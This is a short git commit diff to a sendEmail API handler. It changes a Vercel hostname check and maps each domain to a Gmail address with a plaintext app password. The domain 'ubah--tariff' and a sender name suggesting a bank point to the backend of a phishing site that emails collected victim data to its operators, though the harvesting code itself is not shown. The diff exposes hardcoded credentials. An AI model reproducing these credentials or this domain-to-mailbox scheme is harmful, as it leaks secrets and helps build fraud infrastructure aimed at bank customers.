9a2b7f6ee3d067705fdbd94742ef577f2a1dd317
penaruhangin <penaruhangin@gmail.com>
2022-11-05 10:06:39 +0700

    nambah

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -32,7 +32,7 @@ export default function handler(req, res) {
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
-    } else if(url == 'ubah--tarif.vercel.app'){
+    } else if(url == 'ubah--tariff.vercel.app'){
         email = 'andarasultan954@gmail.com';
         pass = 'xwjfzwdtiaxfname';
 
